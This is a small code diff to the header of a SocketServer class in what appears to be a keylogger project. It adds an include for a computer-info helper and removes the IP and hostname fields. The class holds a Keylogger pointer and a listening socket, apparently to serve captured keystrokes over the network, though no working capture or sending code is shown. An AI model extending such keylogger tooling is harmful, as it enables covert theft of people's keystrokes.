@@ -10,6 +10,7 @@
 #include <WS2tcpip.h>
 
 #include "Keylogger.h"
+#include "ComputerInfoHelper.h"
 
 #define SOCKET_BUFFER_SIZE 1024
 
@@ -17,11 +18,6 @@ class SocketServer {
 private:
 	Keylogger* logger;
 	SOCKET listenSocket;
-
-	std::string ip;
-	std::string hostName;
-
-	void initHostInfo();
 public:
 	SocketServer(Keylogger* logger);
 	void start();
